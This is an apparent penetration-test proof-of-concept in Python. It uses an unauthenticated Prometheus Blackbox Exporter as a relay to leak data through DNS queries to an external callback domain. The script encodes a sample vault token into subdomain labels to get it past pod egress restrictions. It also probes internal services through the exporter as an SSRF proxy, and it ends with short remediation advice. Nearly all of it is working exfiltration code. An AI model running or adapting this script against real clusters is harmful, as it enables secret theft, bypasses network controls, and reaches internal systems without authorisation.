#!/usr/bin/env python3
"""
DNS Exfiltration PoC — Method 2: Blackbox Exporter as DNS Relay
Demonstrates that the unauthenticated Prometheus Blackbox Exporter
can be weaponized as a proxy to make DNS queries to external domains,
even if direct DNS egress from user pods is firewalled.

Attack chain:
  User pod (restricted) → Blackbox Exporter (unrestricted) → External DNS
"""

import requests
import base64
import re

requests.packages.urllib3.disable_warnings()

# ── Config ────────────────────────────────────────────────
BLACKBOX          = "http://198.18.12.79:9115"
INTERACTSH_DOMAIN = "YOUR_CODE.oast.fun"   # replace with yours
FALLBACK_DOMAIN   = "pentest-dns-exfil.example.com"

def encode_payload(data: bytes) -> str:
    b64 = base64.b64encode(data).decode()
    return (b64.replace("=", "")
               .replace("+", "-")
               .replace("/", "_"))

def parse_probe_result(text: str) -> dict:
    """Parse Prometheus metrics from blackbox probe response"""
    metrics = {}
    for line in text.splitlines():
        if line.startswith("#"):
            continue
        parts = line.split(" ")
        if len(parts) == 2:
            metrics[parts[0]] = parts[1]
    return metrics

def exfil_via_blackbox(payload: bytes, domain: str,
                       debug: bool = True) -> dict:
    """
    Route DNS query through the unauthenticated Blackbox Exporter.
    The exporter resolves the target URL — including its DNS lookup —
    on behalf of the caller, bypassing any pod-level DNS restrictions.
    """
    encoded  = encode_payload(payload)
    # Use HTTP target — blackbox resolves DNS as part of the probe
    # Even a failed HTTP connection proves DNS was queried
    target   = f"http://{encoded}.{domain}"

    print(f"  Payload:  {payload}")
    print(f"  Encoded:  {encoded}")
    print(f"  Target:   {target}")
    print(f"  Via:      {BLACKBOX}/probe")

    try:
        r = requests.get(
            f"{BLACKBOX}/probe",
            params={
                "module": "http_2xx",
                "target": target,
                "debug":  str(debug).lower(),
            },
            timeout=15
        )

        metrics = parse_probe_result(r.text)

        dns_rtt    = float(metrics.get(
            "probe_dns_lookup_time_seconds", 0)) * 1000
        http_code  = metrics.get("probe_http_status_code", "0")
        success    = metrics.get("probe_success", "0") == "1"
        dns_worked = dns_rtt > 0

        print(f"  HTTP status: {r.status_code}")
        print(f"  DNS RTT:     {dns_rtt:.0f}ms")
        print(f"  HTTP code:   {http_code}")
        print(f"  Probe ok:    {success}")
        print(f"  DNS reached: {'YES — external DNS queried' if dns_worked else 'NO'}")

        # In debug mode, the full response includes request/response
        # headers — extract the DNS lookup section
        if debug and "Logs for the probe" in r.text:
            log_section = r.text[r.text.find("Logs for the probe"):]
            dns_lines   = [l for l in log_section.splitlines()
                          if "dns" in l.lower() or "resolv" in l.lower()]
            if dns_lines:
                print(f"  DNS log:     {dns_lines[0][:80]}")

        return {
            "payload":    payload,
            "encoded":    encoded,
            "target":     target,
            "dns_rtt_ms": dns_rtt,
            "dns_worked": dns_worked,
            "http_code":  http_code,
            "raw":        r.text[:500],
        }

    except Exception as e:
        print(f"  ERROR: {e}")
        return {"error": str(e)}

def check_blackbox_reachable() -> bool:
    """Verify the blackbox exporter is accessible"""
    try:
        r = requests.get(f"{BLACKBOX}/", timeout=3)
        return r.status_code == 200
    except:
        return False

def probe_internal_via_blackbox(internal_url: str) -> dict:
    """
    Bonus: use blackbox as an HTTP proxy to reach internal services
    not directly reachable from the user pod.
    """
    print(f"\n  [BONUS] Probing internal URL via blackbox:")
    print(f"  Target: {internal_url}")
    r = requests.get(
        f"{BLACKBOX}/probe",
        params={"module": "http_2xx", "target": internal_url},
        timeout=10
    )
    metrics = parse_probe_result(r.text)
    success = metrics.get("probe_success", "0") == "1"
    code    = metrics.get("probe_http_status_code", "?")
    print(f"  Reachable: {success}  HTTP: {code}")
    return metrics

# ── Run ───────────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 55)
    print("  METHOD 2 — Blackbox Exporter as DNS Relay")
    print("=" * 55)

    print(f"\n[*] Checking blackbox exporter at {BLACKBOX}")
    if not check_blackbox_reachable():
        print("  ERROR: Blackbox exporter not reachable")
        exit(1)
    print("  Reachable: YES (no authentication required)")

    # Test 1: simple string via blackbox
    print("\n[Test 1] Simple payload routed via blackbox")
    r1 = exfil_via_blackbox(
        b"Hello World from Blackbox!", FALLBACK_DOMAIN
    )

    # Test 2: simulate exfiltrating a harvested secret
    print("\n[Test 2] Simulated secret exfiltration via blackbox")
    secret = b"vault_token=s.ExampleVaultToken1234"
    r2     = exfil_via_blackbox(secret, FALLBACK_DOMAIN)

    # Test 3: live interactsh (uncomment + set domain)
    # print("\n[Test 3] Live — check app.interactsh.com")
    # r3 = exfil_via_blackbox(b"live-blackbox-exfil", INTERACTSH_DOMAIN)

    # Bonus: show blackbox can also reach internal services
    probe_internal_via_blackbox(
        "http://198.18.19.18:9090/-/healthy"   # Prometheus
    )

    print("\n" + "=" * 55)
    print("  SUMMARY")
    print("=" * 55)
    for label, r in [("Test 1", r1), ("Test 2", r2)]:
        if "error" not in r:
            status = "DNS QUERY SENT" if r["dns_worked"] else "no DNS"
            print(f"  {label}: dns_rtt={r['dns_rtt_ms']:.0f}ms  →  {status}")

    print("""
  Why this is worse than Method 1:
  - Works even if pod DNS egress is restricted
  - No authentication on the Blackbox Exporter
  - Blackbox also probes internal URLs not reachable from pod
  - The monitoring stack becomes the attacker's proxy

  Fix 1 (required): add authentication to the Blackbox Exporter
  Fix 2 (required): restrict Blackbox Exporter's egress via
                    NetworkPolicy to cluster-internal targets only
  Fix 3 (defence):  DNS firewall / RPZ on the cluster resolver
""")
